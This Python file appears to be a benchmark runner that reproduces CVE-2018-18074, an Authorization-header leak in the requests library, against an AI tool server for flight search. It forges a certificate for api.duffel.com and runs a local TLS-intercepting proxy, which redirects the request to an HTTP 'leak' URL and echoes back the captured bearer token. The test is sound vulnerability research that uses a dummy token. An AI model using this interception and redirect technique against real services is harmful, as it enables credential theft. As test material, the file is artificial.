"""Independent GH-P2-002 paired replay runner."""
from __future__ import annotations
import argparse
import json
import socket
import socketserver
import ssl
import subprocess
import threading
from pathlib import Path
from shared_host_runner import evidence_rows, run_shared_host_case
CASE_ID = 'GH-P2-002'
SERVER = 'Shriya-JB/Alexa_trip_planner'
SERVER_COMMIT = 'a4de8ef98b09813a6ea8c1f052aa0ab8f35b1e53'
EFFECT = 'Bearer GT_DUFFEL_TOKEN'
CERT_PATH = Path('/tmp/duffel-runtime.crt')
KEY_PATH = Path('/tmp/duffel-runtime.key')


def generate_runtime_certificate() -> None:
    subprocess.run(
        [
            'openssl', 'req', '-x509', '-newkey', 'rsa:2048', '-nodes',
            '-days', '7', '-subj', '/CN=api.duffel.com',
            '-addext', 'subjectAltName=DNS:api.duffel.com',
            '-keyout', str(KEY_PATH), '-out', str(CERT_PATH),
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        text=True,
    )
    KEY_PATH.chmod(0o600)
    CERT_PATH.chmod(0o644)

def read_request(sock: socket.socket) -> tuple[str, dict[str, str], bytes]:
    data = b''
    while b'\r\n\r\n' not in data:
        chunk = sock.recv(8192)
        if not chunk:
            break
        data += chunk
        if len(data) > 1000000:
            raise ValueError('request headers too large')
    head, _, rest = data.partition(b'\r\n\r\n')
    lines = head.decode('iso-8859-1', errors='replace').split('\r\n')
    first = lines[0] if lines else ''
    headers: dict[str, str] = {}
    for line in lines[1:]:
        if ':' in line:
            key, value = line.split(':', 1)
            headers[key.lower()] = value.strip()
    length = int(headers.get('content-length', '0'))
    while len(rest) < length:
        rest += sock.recv(length - len(rest))
    return (first, headers, rest[:length])

def write_response(sock: socket.socket, status: str, headers: dict[str, str], body: bytes) -> None:
    lines = [f"""HTTP/1.1 {status}"""]
    merged = {'Connection': 'close', 'Content-Length': str(len(body)), **headers}
    lines.extend((f"""{key}: {value}""" for key, value in merged.items()))
    sock.sendall(('\r\n'.join(lines) + '\r\n\r\n').encode('ascii') + body)

class ProxyState:

    def __init__(self) -> None:
        self.requests: list[dict[str, object]] = []
        self.lock = threading.Lock()
        self.server: ThreadingProxy | None = None

    @property
    def port(self) -> int:
        assert self.server is not None
        return int(self.server.server_address[1])

    def add(self, stage: str, first: str, headers: dict[str, str]) -> None:
        with self.lock:
            self.requests.append({'stage': stage, 'request_line': first, 'headers': dict(headers)})

class ThreadingProxy(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

class ProxyHandler(socketserver.BaseRequestHandler):

    def handle(self) -> None:
        state: ProxyState = self.server.state
        self.request.settimeout(10)
        first, headers, _body = read_request(self.request)
        if first.startswith('CONNECT '):
            self.request.sendall(b'HTTP/1.1 200 Connection Established\r\n\r\n')
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(str(CERT_PATH), str(KEY_PATH))
            with context.wrap_socket(self.request, server_side=True) as tls:
                inner_first, inner_headers, _inner_body = read_request(tls)
                state.add('https_initial', inner_first, inner_headers)
                location = 'http://api.duffel.com/leak'
                write_response(tls, '302 Found', {'Location': location}, b'')
            return
        state.add('http_redirect_target', first, headers)
        reflected = headers.get('authorization', '')
        payload = {'data': {'offers': [{'owner': {'name': reflected or 'NO_AUTH'}, 'total_amount': '0', 'total_currency': 'USD'}]}}
        write_response(self.request, '200 OK', {'Content-Type': 'application/json'}, json.dumps(payload).encode('utf-8'))

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument('--side', choices=('vulnerable', 'fixed'), required=True)
    parser.add_argument('--repetition', type=int, choices=(1, 2, 3, 4), required=True)
    parser.add_argument('--output', type=Path, required=True)
    args = parser.parse_args()
    generate_runtime_certificate()
    state = ProxyState()
    server = ThreadingProxy(('127.0.0.1', 0), ProxyHandler)
    server.state = state
    state.server = server
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        env = {'PYTHONPATH': f"""/opt/deps/{args.side}:/opt/deps/common:/workspace/source""", 'PATH': '/usr/local/bin:/usr/bin:/bin', 'HOME': '/tmp/gt-home', 'DUFFEL_ACCESS_TOKEN': 'GT_DUFFEL_TOKEN', 'HTTPS_PROXY': f"""http://127.0.0.1:{state.port}""", 'HTTP_PROXY': f"""http://127.0.0.1:{state.port}""", 'https_proxy': f"""http://127.0.0.1:{state.port}""", 'http_proxy': f"""http://127.0.0.1:{state.port}""", 'NO_PROXY': '', 'no_proxy': '', 'REQUESTS_CA_BUNDLE': str(CERT_PATH), 'PYTHONIOENCODING': 'utf-8', 'PYTHONWARNINGS': 'ignore'}
        record = run_shared_host_case(run_id=f"""{CASE_ID}-{args.side}-{args.repetition}""", case_id=CASE_ID, revision=args.side, repetition=args.repetition, command=['python', '/workspace/source/server.py'], cwd=Path('/workspace/source'), env=env, server_name=SERVER, tool_name='search_flights', tool_arguments={'origin': 'DEL', 'destination': 'BOM', 'departure_date': '2030-01-02'}, task='Call the frozen search_flights Tool and report only its returned result.', system_prompt='You are a deterministic research host. Use the frozen tool call and report only its returned Tool result.', server_revision=SERVER_COMMIT, timeout=45)
        record['external_boundary'] = {'boundary': 'container-local HTTPS CONNECT proxy and HTTP redirect target', 'request_count': len(state.requests), 'requests': state.requests, 'redirect': 'https://api.duffel.com/air/offer_requests -> http://api.duffel.com/leak', 'effect_rule': 'Only the Authorization header on the redirect target and its returned offer owner are the vulnerability-derived signal.'}
        record['pair_metadata'] = {'dependency': 'requests', 'vulnerable_version': '2.19.1', 'fixed_version': '2.20.0', 'vulnerability': 'CVE-2018-18074'}
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / 'host_record.json').write_text(json.dumps(record, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
        (args.output / 'evidence.jsonl').write_text(''.join((json.dumps(row, ensure_ascii=False) + '\n' for row in evidence_rows(record))), encoding='utf-8')
        status = 'OK' if not record['quality']['invalid_run'] else 'INVALID'
        print(json.dumps({'status': status, 'output': str(args.output), 'request_count': len(state.requests)}))
        return 0 if status == 'OK' else 1
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=3)
if __name__ == '__main__':
    raise SystemExit(main())
